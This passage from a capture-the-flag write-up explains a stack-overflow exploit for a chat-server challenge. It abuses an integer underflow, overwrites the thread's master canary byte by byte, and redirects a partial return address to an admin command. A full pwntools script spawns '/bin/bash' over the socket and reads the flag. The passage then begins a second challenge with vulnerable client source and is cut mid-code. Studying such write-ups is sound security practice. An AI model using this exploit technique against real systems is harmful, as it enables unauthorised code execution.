<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>std<span style="color:#f92672">::</span>string Crusader<span style="color:#f92672">::</span>RecvMessage()
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>    msg_buf.len <span style="color:#f92672">-=</span> <span style="color:#66d9ef">sizeof</span>(msg_buf.flags);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (msg_buf.len <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> msg;
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Since <code>sizeof(msg_buf.flags) == 2</code>, if we set <code>msg_buf.len</code> to <code>1</code>, then after <code>msg_buf.len -= sizeof(msg_buf.flags)</code>, <code>msg_buf.len</code> will become <code>0xffff</code>, which leads to a buffer overflow.</p>
<h2 id="bof">BOF<a hidden class="anchor" aria-hidden="true" href="#bof">#</a></h2>
<p>Now we have a stack buffer overflow, but PIE is enabled and there&rsquo;s also a stack canary, so if we want to build a rop chain, some leaks are required. Unfortunately, I can&rsquo;t find any easy way to leak, so I chose to partial overwrite the return address of <code>Crusader::RecvMessage()</code>.</p>
<p>With ASLR turned off, the return address is <code>0x55555555964f</code>, searching around that address, I found out at address <code>0x555555559611</code> is a call to <code>DoAdmin</code> function. <code>DoAdmin</code> first argument is the command to be executed, and luckily when <code>Crusader::RecvMessage()</code> returns, <code>RDI</code> is now holding the address of our buffer. So we can execute arbitrary system command.</p>
<p>However, before we can reach the return address, there&rsquo;s one more thing we need to resolve, which is stack canary. As I mentioned earlier, I didn&rsquo;t see anything could be used for leaking. But looking again at the source code, we can see a new thread is spawned to call <code>ChatServer::RecvCrusaderMessages</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> ChatServer<span style="color:#f92672">::</span>MainLoop()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int8_t</span> new_socket, new_crusader_idx;
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>string welcome_msg;
</span></span><span style="display:flex;"><span>    pthread_t tid;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pthread_create(<span style="color:#f92672">&amp;</span>tid, NULL, <span style="color:#f92672">&amp;</span>ChatServer<span style="color:#f92672">::</span>RecvCrusaderMessages, this);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>The interesting part about threaded function is that the <code>Thread Local Storage (TLS)</code> will be located near the thread stack. You can read more about <code>TLS</code> <a href="https://www.openwall.com/lists/oss-security/2018/02/27/5">here</a>. So if we have enough overflow, we can overwrite the master canary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_msg</span>(msglen, flags, msg):
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;_SEND_MSG&#39;</span>
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p16(msglen)
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p16(flags)
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> msg
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x408</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>								<span style="color:#75715e"># stack canary</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>								<span style="color:#75715e"># return address</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0xd78</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>								<span style="color:#75715e"># overwritten master canary</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>send_msg(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, payload)
</span></span></code></pre></div><hr>
<pre tabindex="0"><code>*RAX  0x0
 RBX  0x0
 RCX  0x555555571ed0 ◂— &#39;aaaaaaaaaaaaaaaaaaaaaaaacccccccc&#39;
 RDX  0x10
 RDI  0x555555571ac0 ◂— 0x6161616161616161 (&#39;aaaaaaaa&#39;)
 RSI  0x7ffff7a27dd0 ◂— &#39;aaaaaaaacccccccc&#39;
 R8   0xffffffffffffffe0
 R9   0x7ffff7d69e70 (main_arena+752) —▸ 0x7ffff7d69e60 (main_arena+736) —▸ 0x7ffff7d69e50 (main_arena+720) —▸ 0x7ffff7d69e40 (main_arena+704) —▸ 0x7ffff7d69e30 (main_arena+688) ◂— ...
 R10  0x7ffff00008d0 ◂— 0x0
 R11  0x555555571ac0 ◂— 0x6161616161616161 (&#39;aaaaaaaa&#39;)
 R12  0xa
 R13  0x0
 R14  0xa
 R15  0x0
 RBP  0x7ffff7a27dd0 ◂— &#39;aaaaaaaacccccccc&#39;
 RSP  0x7ffff7a27990 —▸ 0x555555571a60 ◂— 0x0
*RIP  0x55555555a208 (Crusader::RecvMessage[abi:cxx11]()+466) ◂— je     0x55555555a20f
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   0x55555555a1a2 &lt;Crusader::RecvMessage[abi:cxx11]()+364&gt;    mov    rdi, rax
   0x55555555a1a5 &lt;Crusader::RecvMessage[abi:cxx11]()+367&gt;    call   0x5555555576d0                &lt;0x5555555576d0&gt;
 
   0x55555555a1aa &lt;Crusader::RecvMessage[abi:cxx11]()+372&gt;    jmp    Crusader::RecvMessage[abi:cxx11]()+453                &lt;Crusader::RecvMessage[abi:cxx11]()+453&gt;
    ↓
   0x55555555a1fb &lt;Crusader::RecvMessage[abi:cxx11]()+453&gt;    mov    rax, qword ptr [rbp - 0x18]
   0x55555555a1ff &lt;Crusader::RecvMessage[abi:cxx11]()+457&gt;    xor    rax, qword ptr fs:[0x28]
 ► 0x55555555a208 &lt;Crusader::RecvMessage[abi:cxx11]()+466&gt;  ✔ je     Crusader::RecvMessage[abi:cxx11]()+473                &lt;Crusader::RecvMessage[abi:cxx11]()+473&gt;
    ↓
   0x55555555a20f &lt;Crusader::RecvMessage[abi:cxx11]()+473&gt;    mov    rax, qword ptr [rbp - 0x438]
   0x55555555a216 &lt;Crusader::RecvMessage[abi:cxx11]()+480&gt;    add    rsp, 0x438
   0x55555555a21d &lt;Crusader::RecvMessage[abi:cxx11]()+487&gt;    pop    rbx
   0x55555555a21e &lt;Crusader::RecvMessage[abi:cxx11]()+488&gt;    pop    rbp
   0x55555555a21f &lt;Crusader::RecvMessage[abi:cxx11]()+489&gt;    ret    
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffff7a27990 —▸ 0x555555571a60 ◂— 0x0
01:0008│     0x7ffff7a27998 —▸ 0x7ffff7a27e90 —▸ 0x555555571ac0 ◂— 0x6161616161616161 (&#39;aaaaaaaa&#39;)
02:0010│     0x7ffff7a279a0 ◂— 0x0
03:0018│     0x7ffff7a279a8 ◂— 0x0
04:0020│     0x7ffff7a279b0 ◂— 0x6161616161616161 (&#39;aaaaaaaa&#39;)
... ↓        3 skipped
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0   0x55555555a208 Crusader::RecvMessage[abi:cxx11]()+466
   f 1 0x6363636363636363
   f 2              0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; 
</code></pre><h2 id="another-problem">Another problem?<a hidden class="anchor" aria-hidden="true" href="#another-problem">#</a></h2>
<p>Now we can bypass canary. But here comes another problem.</p>
<pre tabindex="0"><code> RAX  0x7ffff7a27e90 —▸ 0x555555571ac0 ◂— 0x6161616161616161 (&#39;aaaaaaaa&#39;)
 RBX  0x6161616161616161 (&#39;aaaaaaaa&#39;)
 RCX  0x555555571ed0 ◂— &#39;aaaaaaaaaaaaaaaaaaaaaaaacccccccc&#39;
 RDX  0x10
 RDI  0x555555571ac0 ◂— 0x6161616161616161 (&#39;aaaaaaaa&#39;)
 RSI  0x7ffff7a27dd0 ◂— &#39;aaaaaaaacccccccc&#39;
 R8   0xffffffffffffffe0
 R9   0x7ffff7d69e70 (main_arena+752) —▸ 0x7ffff7d69e60 (main_arena+736) —▸ 0x7ffff7d69e50 (main_arena+720) —▸ 0x7ffff7d69e40 (main_arena+704) —▸ 0x7ffff7d69e30 (main_arena+688) ◂— ...
 R10  0x7ffff00008d0 ◂— 0x0
 R11  0x555555571ac0 ◂— 0x6161616161616161 (&#39;aaaaaaaa&#39;)
 R12  0xa
 R13  0x0
 R14  0xa
 R15  0x0
*RBP  0x6161616161616161 (&#39;aaaaaaaa&#39;)
*RSP  0x7ffff7a27dd8 ◂— &#39;cccccccc&#39;
*RIP  0x55555555a21f (Crusader::RecvMessage[abi:cxx11]()+489) ◂— ret    
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   0x55555555a208 &lt;Crusader::RecvMessage[abi:cxx11]()+466&gt;    je     Crusader::RecvMessage[abi:cxx11]()+473                &lt;Crusader::RecvMessage[abi:cxx11]()+473&gt;
    ↓
   0x55555555a20f &lt;Crusader::RecvMessage[abi:cxx11]()+473&gt;    mov    rax, qword ptr [rbp - 0x438]
   0x55555555a216 &lt;Crusader::RecvMessage[abi:cxx11]()+480&gt;    add    rsp, 0x438
   0x55555555a21d &lt;Crusader::RecvMessage[abi:cxx11]()+487&gt;    pop    rbx
   0x55555555a21e &lt;Crusader::RecvMessage[abi:cxx11]()+488&gt;    pop    rbp
 ► 0x55555555a21f &lt;Crusader::RecvMessage[abi:cxx11]()+489&gt;    ret    &lt;0x6363636363636363&gt;




───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffff7a27dd8 ◂— &#39;cccccccc&#39;
01:0008│     0x7ffff7a27de0 ◂— 0x0
... ↓        6 skipped
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0   0x55555555a21f Crusader::RecvMessage[abi:cxx11]()+489
   f 1 0x6363636363636363
   f 2              0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; 
</code></pre><p>As you can see, we have to overwrite full 8 bytes of the return address in order to reach the master canary. Again, we don&rsquo;t have any leaks, so this is probably not what we expect.</p>
<p>If we notice, <code>msg_buf.buffer</code> is at [rbp - 0x420] and <code>msg_buf.len</code> is at [rbp - 0x1e], which means we can overwrite <code>msg_buf.len</code> to a controlled value.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>std<span style="color:#f92672">::</span>string Crusader<span style="color:#f92672">::</span>RecvMessage()
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>	msg_buf.buffer[msg_buf.len] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\x00&#39;</span>;
</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">+=</span> msg_buf.buffer;
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>My approach is to overwrite the master canary one byte at a time. After 7 times, we can change canary to 0 without having to touch the return address.</p>
<h2 id="final-script">Final script<a hidden class="anchor" aria-hidden="true" href="#final-script">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = remote(&#39;localhost&#39;, 9999)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;pwn-corchat-b293bf49f31ff8e3.be.ax&#39;</span>, <span style="color:#ae81ff">1337</span>, ssl<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_msg</span>(msglen, flags, msg):
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;_SEND_MSG&#39;</span>
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p16(msglen)
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p16(flags)
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> msg
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x402</span>
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p16(i <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd78</span>)
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>	sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	send_msg(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/bash 0&gt;&amp;4 1&gt;&amp;4 2&gt;&amp;4&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cmd
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x402</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">0x420</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x11</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>send_msg(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 solve.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to pwn-corchat-b293bf49f31ff8e3.be.ax on port 1337: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>Welcome to CoRChat!
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ctf<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ctf<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ctf<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>corchat_server
</span></span><span style="display:flex;"><span>flag.txt
</span></span><span style="display:flex;"><span>$ cat flag.txt
</span></span><span style="display:flex;"><span>corctf<span style="color:#f92672">{</span>pThr34D_g03s_brrrr<span style="color:#f92672">}</span>
</span></span></code></pre></div><h1 id="nbd">nbd:<a hidden class="anchor" aria-hidden="true" href="#nbd">#</a></h1>
<ul>
<li>Category: pwn</li>
<li>Points: 362</li>
<li>Solves: 8</li>
<li>Description: You pwned the server in 4th Real World CTF, can you pwn the client now?</li>
</ul>
<p>I didn&rsquo;t work on this challenge until my teammate hit me up telling me a suspicious function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ask_list</span>(<span style="color:#66d9ef">int</span> sock) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> opt_server;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> len;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> lenn;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> reptype;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint64_t</span> magic;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> rlen;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> BUF_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[BUF_SIZE];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	send_request(sock, NBD_OPT_LIST, <span style="color:#ae81ff">0</span>, NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* newline, move away from the &#34;Negotiation:&#34; line */</span>
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>		memset(buf, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1024</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(read(sock, <span style="color:#f92672">&amp;</span>magic, <span style="color:#66d9ef">sizeof</span>(magic)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#34;Reading magic from server: %m&#34;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(read(sock, <span style="color:#f92672">&amp;</span>opt_server, <span style="color:#66d9ef">sizeof</span>(opt_server)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#34;Reading option: %m&#34;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(read(sock, <span style="color:#f92672">&amp;</span>reptype, <span style="color:#66d9ef">sizeof</span>(reptype)) <span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#34;Reading reply from server: %m&#34;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(read(sock, <span style="color:#f92672">&amp;</span>len, <span style="color:#66d9ef">sizeof</span>(len)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#34;Reading length from server: %m&#34;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		magic<span style="color:#f92672">=</span>ntohll(magic);
</span></span><span style="display:flex;"><span>		len<span style="color:#f92672">=</span>ntohl(len);
</span></span><span style="display:flex;"><span>		reptype<span style="color:#f92672">=</span>ntohl(reptype);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(magic <span style="color:#f92672">!=</span> rep_magic) {
</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#34;Not enough magic from server&#34;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(reptype <span style="color:#f92672">&amp;</span> NBD_REP_FLAG_ERROR) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">switch</span>(reptype) {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">case</span> NBD_REP_ERR_POLICY:
</span></span><span style="display:flex;"><span>					fprintf(stderr, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">E: listing not allowed by server.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>					fprintf(stderr, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">E: unexpected error from server.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span>(len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> len <span style="color:#f92672">&lt;</span> BUF_SIZE) {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span>((rlen<span style="color:#f92672">=</span>read(sock, buf, len)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>					fprintf(stderr, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">E: could not read error message from server</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>				} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>					buf[rlen] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>					fprintf(stderr, <span style="color:#e6db74">&#34;Server said: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span>(reptype <span style="color:#f92672">!=</span> NBD_REP_ACK) {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span>(reptype <span style="color:#f92672">!=</span> NBD_REP_SERVER) {
</span></span><span style="display:flex;"><span>					err(<span style="color:#e6db74">&#34;Server sent us a reply we don&#39;t understand!&#34;</span>);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span>(read(sock, <span style="color:#f92672">&amp;</span>lenn, <span style="color:#66d9ef">sizeof</span>(lenn)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>					fprintf(stderr, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">E: could not read export name length from server</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>					exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				lenn<span style="color:#f92672">=</span>ntohl(lenn);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (lenn <span style="color:#f92672">&gt;=</span> BUF_SIZE) {
</span></span><span style="display:flex;"><span>					fprintf(stderr, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">E: export name on server too long</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>					exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span>(read(sock, buf, lenn) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>					fprintf(stderr, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">E: could not read export name from server</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>					exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				buf[lenn] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>				printf(<span style="color:#e6db74">&#34;%s&#34;</span>, buf);
</span></span><span style="display:flex;"><span>				len <span style="color:#f92672">-=</span> lenn;
</span></span><span style="display:flex;"><span>				len <span style="color:#f92672">-=</span> <span style="color:#66d9ef">sizeof</span>(lenn);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span>(len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span>(read(sock, buf, len) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>						fprintf(stderr, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">E: could not read export description from server</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>						exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					buf[len] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>					printf(<span style="color:#e6db74">&#34;: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
</span></span><span style="display:flex;"><span>				} <span style="color:#66d9ef">else</span> {
